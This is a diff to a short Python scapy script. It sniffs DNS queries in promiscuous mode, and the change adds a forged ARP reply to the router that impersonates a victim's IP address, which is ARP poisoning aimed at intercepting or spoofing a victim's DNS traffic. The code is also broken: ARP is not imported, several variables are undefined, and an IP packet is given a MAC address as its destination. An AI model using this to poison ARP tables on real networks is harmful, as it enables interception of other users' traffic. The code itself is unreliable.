@@ -1,13 +1,15 @@
-from scapy.all import sniff, DNS, DNSQR, DNSRR
+from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP
 
 
-if (sniff(prn=lambda x: x.show(), filter="port 53",promisc=1))[0].haslayer(DNS) and [0].getlayer(DNS).qr==0:
-    print ([0].getlayer(DNS).qd.qname)
-    print ([0].getlayer(DNS).qd.qtype)
-    print ([0].getlayer(DNS).qd.qclass)
-    print ([0].getlayer(DNS).id)
-    print ([0].getlayer(DNS).an)
-    print ([0].getlayer(DNS).ns)
-    print ([0].getlayer(DNS).ar)
+a=sniff(count=1, prn=lambda x: x.show(), filter="port 53",promisc=1)
+if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
+    srp((IP(dst=routermac)/ARP(op = 2,pdst=routerip, psrc=ip[victim])), timeout=3, verbose=0)
+    print (a[0].getlayer(DNS).qd.qname)
+    print (a[0].getlayer(DNS).qd.qtype)
+    print (a[0].getlayer(DNS).qd.qclass)
+    print (a[0].getlayer(DNS).id)
+    print (a[0].getlayer(DNS).an)
+    print (a[0].getlayer(DNS).ns)
+    print (a[0].getlayer(DNS).ar)
     
 
